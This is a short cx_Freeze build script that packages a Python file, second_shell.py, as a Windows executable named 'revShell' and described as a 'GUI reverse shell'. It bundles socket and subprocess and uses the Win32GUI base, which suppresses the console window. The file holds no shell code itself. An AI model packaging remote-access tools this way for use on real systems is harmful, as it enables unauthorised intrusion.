import sys
import os
from cx_Freeze import setup, Executable

os.environ['TCL_LIBRARY'] = r'C:\Users\Andreas\AppData\Local\Programs\Python\Python38-32\tcl\tcl8.6'
os.environ['TK_LIBRARY'] = r'C:\Users\Andreas\AppData\Local\Programs\Python\Python38-32\tcl\tk8.6'

include_dlls = [r'C:\Users\Andreas\AppData\Local\Programs\Python\Python38-32\DLLs\tk86t.dll']

build_exe_options = {"packages": ["os", "socket", "subprocess", "sys", "tkinter"], "include_files": include_dlls}

base = None
if sys.platform == "win32":
    base = "Win32GUI"

setup(name="revShell", version="0.0.1", description="GUI reverse shell", options={"build_exe": build_exe_options}, executables=[Executable("second_shell.py", base=base)])

